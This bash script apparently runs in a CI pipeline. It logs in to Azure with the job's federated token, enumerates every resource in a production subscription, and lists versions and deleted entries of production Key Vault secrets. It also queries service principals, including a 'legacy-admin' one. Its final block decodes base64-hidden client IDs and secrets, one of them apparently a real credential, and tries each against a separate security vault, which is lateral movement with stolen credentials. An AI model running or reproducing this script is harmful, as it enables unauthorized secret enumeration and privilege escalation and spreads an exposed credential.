#!/usr/bin/env bash
set -uo pipefail

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG="rg-tbl-platform-prod-sea"
ARM_BASE="https://management.azure.com"
ARM=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv)

echo "=== ALL RESOURCE GROUPS IN SUBSCRIPTION ==="
curl -sS "$ARM_BASE/subscriptions/$SUB/resourcegroups?api-version=2021-04-01" \
  -H "Authorization: Bearer $ARM" | python3 -c '
import sys,json
d=json.load(sys.stdin)
for rg in d.get("value",[]):
    print(f"{rg[\"name\"]} ({rg[\"location\"]})")
'

echo "=== ALL RESOURCES IN ALL RGs ==="
curl -sS "$ARM_BASE/subscriptions/$SUB/resources?api-version=2021-04-01" \
  -H "Authorization: Bearer $ARM" | python3 -c '
import sys,json
d=json.load(sys.stdin)
for r in d.get("value",[]):
    print(f"{r[\"type\"].split(\"/\")[-1]}: {r[\"name\"]} (rg={r.get(\"id\",\"\").split(\"/resourceGroups/\")[1].split(\"/\")[0] if \"/resourceGroups/\" in r.get(\"id\",\"\") else \"?\"})")
' 2>/dev/null

echo "=== KV PROD SECRET VERSIONS ==="
VTOK=$(az account get-access-token --resource https://vault.azure.net --query accessToken -o tsv)
for secret in cost-reader-principal directory-audit-principal reporting-service-principal \
              reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  echo "--- $secret versions ---"
  curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$secret/versions?api-version=7.4" \
    -H "Authorization: Bearer $VTOK" | python3 -c '
import sys,json
d=json.load(sys.stdin)
for v in d.get("value",[]):
    vid=v["id"].split("/")[-1]
    attrs=v.get("attributes",{})
    print(f"  version={vid[:8]} enabled={attrs.get(\"enabled\")} created={attrs.get(\"created\")}")
' 2>/dev/null
done

echo "=== KV PROD ALL SECRETS INCLUDING DELETED ==="
curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/deletedsecrets?api-version=7.4" \
  -H "Authorization: Bearer $VTOK" | head -c 1000

echo "=== GRAPH: LOOKUP d2cdf247 AND 43834909 ==="
GT=$(az account get-access-token --resource https://graph.microsoft.com --query accessToken -o tsv 2>/dev/null || echo "")
if [ -n "$GT" ]; then
  echo "d2cdf247: $(curl -sS 'https://graph.microsoft.com/v1.0/servicePrincipals/d2cdf247-9319-40cb-8324-5a005ef538da' -H "Authorization: Bearer $GT" | head -c 600)"
  echo "43834909: $(curl -sS 'https://graph.microsoft.com/v1.0/servicePrincipals/43834909-47cf-4a4a-8048-e323b4897ed3' -H "Authorization: Bearer $GT" | head -c 600)"
  echo "legacy-admin SP: $(curl -sS 'https://graph.microsoft.com/v1.0/servicePrincipals?$filter=appId eq '"'"'891fb158-e02c-4428-a885-53b811f369c0'"'" -H "Authorization: Bearer $GT" | head -c 600)"
else
  echo "No graph token"
fi

echo "=== KV SEC: TRY EACH KNOWN SP ==="
for cid_b64 in \
  "MDM4YmMzNWQtMTMxZC00OTUzLTk5ODUtZmY0YTI0NWNjZWMx|MUJFOFF+eUdROGVfejZWQmN6bEdKOFllT0hnTlJVZmZiZ051ZmIybQ==" \
  "ODkxZmIxNTgtZTAyYy00NDI4LWE4ODUtNTNiODExZjM2OWMw|INVALID_NO_SECRET"; do
  CID=$(echo "${cid_b64%%|*}" | base64 -d)
  SEC_B64="${cid_b64##*|}"
  SEC=$(echo "$SEC_B64" | base64 -d 2>/dev/null || echo "")
  if [ -z "$SEC" ]; then continue; fi
  VTOK2=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
    --data-urlencode "client_id=$CID" --data-urlencode "client_secret=$SEC" \
    --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://vault.azure.net/.default" \
    | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
  if [ "${#VTOK2}" -gt 100 ]; then
    echo "SP $CID vs KV SEC: $(curl -sS 'https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4' -H "Authorization: Bearer $VTOK2" | head -c 300)"
  fi
done

echo "DONE"
